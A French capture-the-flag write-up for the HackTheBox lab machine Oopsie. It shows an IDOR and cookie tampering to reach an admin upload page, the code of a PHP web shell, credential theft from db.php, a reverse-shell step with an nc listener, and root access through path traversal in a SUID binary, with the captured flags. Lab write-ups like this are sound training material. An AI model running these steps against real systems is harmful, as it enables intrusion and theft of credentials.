# Write-up -- HackTheBox : Oopsie

Write-up réalisé pour la machine Oopsie de HackTheBox. L'objectif est d'exploiter une mauvaise gestion des droits d'accès via les cookies de session pour accéder à une fonctionnalité d'upload réservée aux admins, y déposer un reverse shell, puis escalader les privilèges via un binaire SUID qui appelle `cat` de façon non sécurisée.

L'IP de la machine pendant ma session était `10.129.86.251`.

---

## 1. Outil d'interception du trafic web

Pour intercepter du trafic HTTP en pentest, on utilise un **proxy** : un outil qui se place entre le navigateur et le serveur pour capturer et modifier les échanges. L'outil de référence pour ça est Burp Suite.

---

## 2. Découverte de la page de connexion

En regardant le code source de la page d'accueil, on repère en bas une balise script suspecte :

```html
<script src="/cdn-cgi/login/script.js"></script>
```

Le chemin `/cdn-cgi/login/` mène directement à une page de connexion.

---

## 3. Accès à la page d'upload et modification du cookie

On essaie quelques identifiants courants sans succès. On clique sur **"Login as Guest"**, ce qui nous amène sur `admin.php`. En naviguant vers l'onglet **Uploads**, on obtient le message :

```
This action require super admin rights.
```

Avec l'extension **Cookie Editor**, on inspecte notre cookie de session. Il contient `user=2233`. C'est cette valeur qu'il va falloir manipuler pour usurper l'identité de l'admin.

---

## 4. Récupération de l'Access ID de l'admin

L'onglet **Account** affiche notre Access ID en tant que Guest : `2233`. L'URL de cette page est :

```
http://10.129.86.251/cdn-cgi/login/admin.php?content=accounts&id=2
```

Le paramètre `id` contrôle quel compte est affiché, c'est une **IDOR** (Insecure Direct Object Reference) : aucune vérification n'est faite côté serveur pour s'assurer qu'on ne consulte que notre propre compte. En passant `id=1`, on obtient le profil de l'admin et son Access ID : **34322**.

On met à jour notre cookie avec `user=34322` via Cookie Editor, on recharge la page, et l'onglet Uploads devient accessible.

---

## 5. Upload d'un web shell et localisation du dossier

Maintenant qu'on a accès à l'upload, on dépose un web shell PHP :

```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```

L'upload réussit. Pour trouver où le fichier a atterri sur le serveur, on énumère les répertoires avec gobuster :

```bash
gobuster dir -u http://10.129.86.251/ -w /usr/share/wordlists/dirb/common.txt
```

On trouve le dossier **`/uploads`**. On vérifie que le shell fonctionne :

```
http://10.129.86.251/uploads/web_shell.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 6. Découverte du fichier contenant les credentials de robert

On fouille le serveur via le web shell. Dans le répertoire de l'application de login, on trouve un fichier `db.php` qui contient les credentials de connexion à la base de données :

```
http://10.129.86.251/uploads/web_shell.php?cmd=cat%20/var/www/html/cdn-cgi/login/db.php
```

Le contenu s'affiche dans le source HTML de la réponse (il faut ouvrir l'inspecteur pour le voir, sinon PHP interprète les balises) :

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

- **Utilisateur :** `robert`
- **Mot de passe :** `M3g4C0rpUs3r!`

Le fichier en question est **`db.php`**.

---

## 7. Reverse shell, connexion en tant que robert, et identification du binaire bugtracker

Le web shell est limité, on passe à un reverse shell PHP complet (disponible sur [revshells.com](https://www.revshells.com/)). On y renseigne notre IP et le port d'écoute, on upload le fichier, et on ouvre le listener :

```bash
nc -lvnp 4444
```

En visitant `http://10.129.86.251/uploads/rev_shell.php`, la connexion arrive. On stabilise le shell avec :

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

On se connecte ensuite en tant que `robert` avec le mot de passe trouvé à l'étape précédente :

```bash
su robert
# Mot de passe : M3g4C0rpUs3r!
```

Pour trouver les fichiers appartenant au groupe `bugtracker`, on utilise **`find`** :

```bash
find / -group bugtracker 2>/dev/null
```

```
/usr/bin/bugtracker
```

On l'exécute pour comprendre son comportement :

```
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 754
cat: /root/reports/754: No such file or directory
```

Il concatène l'ID saisi avec `/root/reports/` et affiche le fichier correspondant via `cat`. C'est `find` qu'on a utilisé pour identifier le binaire.

---

## 8. Vérification des droits d'exécution du binaire

On inspecte les permissions du binaire :

```bash
ls -la /usr/bin/bugtracker
```

```
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

Le bit **SUID** est positionné (le `s` à la place du `x` pour le propriétaire). Peu importe quel utilisateur lance ce binaire, il s'exécutera toujours avec les droits de son propriétaire : **root**.

---

## 9. SUID 

**SUID** signifie **Set owner User ID**. Quand ce bit est positionné sur un exécutable, tout processus qui le lance acquiert temporairement les droits du propriétaire du fichier, ici root. Ce méchanisme devient un vecteur d'escalade de privilèges si le binaire concerné peut être détourné.

---

## 10. Appel non sécurisé de `cat`

En observant le comportement de `bugtracker`, on voit qu'il appelle **`cat`** pour lire les fichiers de rapport. Dans notre cas, on va exploiter directement le fait que l'ID est concaténé sans validation à un chemin de fichier, ce qui permet une **path traversal**.

---

## 11. Flag user

Le flag utilisateur se trouve dans le home de robert :

```bash
robert@oopsie:~$ cat user.txt
```

**Flag user :** `f2c74ee8db7983851ab2a96a44eb7981`

---

## 12. Flag root

On exploite la path traversal dans `bugtracker` : l'ID saisi est directement concaténé à `/root/reports/` sans aucune validation. En passant `../root.txt` comme ID, on remonte d'un niveau et on lit `/root/root.txt` avec les droits root :

```bash
robert@oopsie:~$ /usr/bin/bugtracker
```

```
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ../root.txt
---------------

af13b0bee69f8a877c3faf667f7beacf
```

**Flag root :** `af13b0bee69f8a877c3faf667f7beacf`
